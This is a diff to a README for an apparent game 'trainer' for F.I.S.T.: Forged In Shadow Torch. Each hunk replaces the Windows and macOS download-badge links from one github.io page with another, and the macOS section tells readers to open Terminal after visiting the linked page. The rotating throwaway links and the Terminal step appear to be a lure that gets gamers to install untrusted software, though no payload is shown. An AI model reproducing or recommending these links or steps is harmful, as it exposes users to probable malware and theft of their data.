@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download F.I.S.T. Forged In Shadow Torch Trainer](https://img.shields.io/badge/⬇_Download_F.I.S.T.%20Forged%20In%20Shadow%20Torch_Trainer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download F.I.S.T. Forged In Shadow Torch Trainer](https://img.shields.io/badge/⬇_Download_F.I.S.T.%20Forged%20In%20Shadow%20Torch_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -74,9 +74,9 @@ F.I.S.T.: Forged In Shadow Torch is a diesel-punk Metroidvania featuring Rayton,
 
 <div align="center">
 
-[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
@@ -97,7 +97,7 @@ F.I.S.T.: Forged In Shadow Torch is a diesel-punk Metroidvania featuring Rayton,
 
 <div align="center">
 
-[![⬇ Download F.I.S.T. Forged In Shadow Torch Trainer](https://img.shields.io/badge/⬇_Download_F.I.S.T.%20Forged%20In%20Shadow%20Torch_Trainer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download F.I.S.T. Forged In Shadow Torch Trainer](https://img.shields.io/badge/⬇_Download_F.I.S.T.%20Forged%20In%20Shadow%20Torch_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -129,7 +129,7 @@ F.I.S.T.: Forged In Shadow Torch is a diesel-punk Metroidvania featuring Rayton,
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 1. Click the badge above to open the macOS trainer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -154,7 +154,7 @@ F.I.S.T.: Forged In Shadow Torch is a diesel-punk Metroidvania featuring Rayton,
 
 <div align="center">
 
-[![⬇ Download F.I.S.T. Forged In Shadow Torch Trainer](https://img.shields.io/badge/⬇_Download_F.I.S.T.%20Forged%20In%20Shadow%20Torch_Trainer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download F.I.S.T. Forged In Shadow Torch Trainer](https://img.shields.io/badge/⬇_Download_F.I.S.T.%20Forged%20In%20Shadow%20Torch_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
